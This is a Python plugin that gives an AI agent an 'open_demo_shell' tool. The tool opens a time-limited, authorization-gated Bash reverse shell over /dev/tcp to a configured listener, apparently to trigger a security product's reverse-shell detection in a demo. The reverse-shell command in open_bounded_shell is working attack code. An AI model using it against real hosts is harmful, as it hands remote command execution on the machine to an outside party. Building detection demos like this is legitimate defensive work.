from __future__ import annotations

import asyncio
import ipaddress
import os
import shlex
import socket
import subprocess
import time
from collections import OrderedDict
from typing import Literal

import httpx
from pydantic import SecretStr
from nat.plugin_api import (
    Builder,
    FunctionGroup,
    FunctionGroupBaseConfig,
    register_function_group,
)

from .proc_tcp import tcp_source_to_dest

SHELL_SESSION_SECONDS = 20
CONNECT_TIMEOUT_SECONDS = 8.0


def bearer_token(configured: SecretStr) -> str:
    """Prefer the pod env; NAT may leave ${VAR} unexpanded in SecretStr fields."""
    env_token = os.environ.get("ARGUS_GTC_AGENT_TOKEN", "")
    configured_token = configured.get_secret_value()
    if env_token:
        return env_token
    if configured_token and not configured_token.startswith("${"):
        return configured_token
    return ""


def shell_process_name(scenario_run_id: str) -> str:
    return f"argus-gtc-agent-shell-{scenario_run_id}"


class HostAccessConfig(FunctionGroupBaseConfig, name="argus_gtc_host_access"):
    """Configuration for a single fixed demo-shell simulation."""

    host_ip: str
    host_port: int = 31999
    connect_timeout_seconds: float = CONNECT_TIMEOUT_SECONDS
    shell_seconds: float = SHELL_SESSION_SECONDS
    authorization_url: str
    report_url: str
    agent_token: SecretStr


@register_function_group(config_type=HostAccessConfig)
async def build_host_access_group(config: HostAccessConfig, _builder: Builder):
    group = FunctionGroup(config=config, instance_name="demo")
    attempted_runs: OrderedDict[str, None] = OrderedDict()
    attempt_lock = asyncio.Lock()

    async def open_demo_shell(scenario_run_id: str) -> dict[str, str | int]:
        """Open one bounded Bash reverse shell to the fixed demo listener.

        Uses bash /dev/tcp so native Argus reverse_shell_detection can raise
        Reverse Shell Detected. The destination IP and port come from pod
        configuration, never from the model. The session lasts at most 20
        seconds. The listener, not this tool, chooses the command it sends
        (the demo uses id).
        """
        if len(scenario_run_id) != 12 or any(
            character not in "0123456789abcdef" for character in scenario_run_id
        ):
            return {"tool_name": "open_demo_shell", "outcome": "invalid_run_id"}

        async with attempt_lock:
            if scenario_run_id in attempted_runs:
                return {
                    "tool_name": "open_demo_shell",
                    "scenario_run_id": scenario_run_id,
                    "outcome": "already-attempted",
                }
            attempted_runs[scenario_run_id] = None
            if len(attempted_runs) > 256:
                attempted_runs.popitem(last=False)

        try:
            async with httpx.AsyncClient(timeout=5.0) as client:
                authorization = await client.post(
                    config.authorization_url,
                    json={"scenario_run_id": scenario_run_id},
                    headers={"Authorization": f"Bearer {bearer_token(config.agent_token)}"},
                )
                authorization.raise_for_status()
                authorized = authorization.json().get("authorized") is True
        except httpx.HTTPError:
            return {
                "tool_name": "open_demo_shell",
                "scenario_run_id": scenario_run_id,
                "outcome": "authorization-unavailable",
            }
        if not authorized:
            return {
                "tool_name": "open_demo_shell",
                "scenario_run_id": scenario_run_id,
                "outcome": "not-authorized-for-this-profile",
            }

        started = time.monotonic()
        outcome: Literal[
            "connected", "timeout", "connection-refused", "network-error"
        ]
        source_ip: str | None = None
        source_port: int | None = None
        process_name = shell_process_name(scenario_run_id)
        try:
            destination_ip = resolve_demo_host(config.host_ip)
        except OSError:
            destination_ip = config.host_ip
            outcome = "network-error"
        else:
            try:
                outcome, source_ip, source_port = await asyncio.to_thread(
                    open_bounded_shell,
                    destination_ip,
                    config.host_port,
                    config.connect_timeout_seconds,
                    config.shell_seconds,
                    process_name,
                )
            except OSError:
                outcome = "network-error"

        report: dict[str, str | int] = {
            "tool_name": "open_demo_shell",
            "scenario_run_id": scenario_run_id,
            "outcome": outcome,
            "destination_ip": destination_ip,
            "destination_port": config.host_port,
            "process_name": process_name,
            "duration_ms": int((time.monotonic() - started) * 1000),
        }
        if source_ip and source_port:
            report["source_ip"] = source_ip
            report["source_port"] = source_port
        try:
            async with httpx.AsyncClient(timeout=5.0) as client:
                response = await client.post(
                    config.report_url,
                    json={
                        key: value
                        for key, value in report.items()
                        if key != "tool_name"
                    },
                    headers={"Authorization": f"Bearer {bearer_token(config.agent_token)}"},
                )
                response.raise_for_status()
        except httpx.HTTPError:
            report["reporting_status"] = "unavailable"
        else:
            report["reporting_status"] = "recorded"
        return report

    group.add_function(
        name="open_demo_shell",
        fn=open_demo_shell,
        description=open_demo_shell.__doc__,
    )
    yield group


def resolve_demo_host(host: str) -> str:
    try:
        return str(ipaddress.ip_address(host))
    except ValueError:
        for info in socket.getaddrinfo(host, None, socket.AF_INET, socket.SOCK_STREAM):
            return str(info[4][0])
        raise OSError(f"unable to resolve demo host {host}")


def open_bounded_shell(
    host: str,
    port: int,
    connect_timeout: float,
    session_seconds: float,
    process_name: str,
) -> tuple[str, str | None, int | None]:
    """Open a bounded interactive Bash reverse shell via /dev/tcp.

    A Python socket with bash -i only produced Argus Process Created INFO.
    Argus reverse_shell_detection matches the same /dev/tcp pattern used by
    the invisible-vm Reverse Shell Simulation.
    """
    host = resolve_demo_host(host)
    started = time.monotonic()
    command = [
        "bash",
        "-c",
        (
            f"exec -a {shlex.quote(process_name)} "
            "bash --noprofile --norc -i "
            f"0<>/dev/tcp/{host}/{int(port)} 1>&0 2>&0"
        ),
    ]
    process = subprocess.Popen(
        command,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
        start_new_session=True,
        close_fds=True,
    )
    source_ip: str | None = None
    source_port: int | None = None
    connect_deadline = started + connect_timeout
    while time.monotonic() < connect_deadline:
        source_ip, source_port = tcp_source_to_dest(host, port, process.pid)
        if source_port:
            break
        if process.poll() is not None:
            stderr = b""
            if process.stderr is not None:
                stderr = process.stderr.read() or b""
            detail = stderr.decode("utf-8", errors="replace").casefold()
            outcome = (
                "connection-refused"
                if "connection refused" in detail
                else "network-error"
            )
            return outcome, source_ip, source_port
        time.sleep(0.05)
    if not source_port:
        process.kill()
        try:
            process.wait(timeout=3)
        except subprocess.TimeoutExpired:
            pass
        return "timeout", None, None
    remaining = session_seconds - (time.monotonic() - started)
    try:
        process.wait(timeout=max(1.0, remaining))
    except subprocess.TimeoutExpired:
        process.kill()
        process.wait(timeout=3)
    return "connected", source_ip, source_port
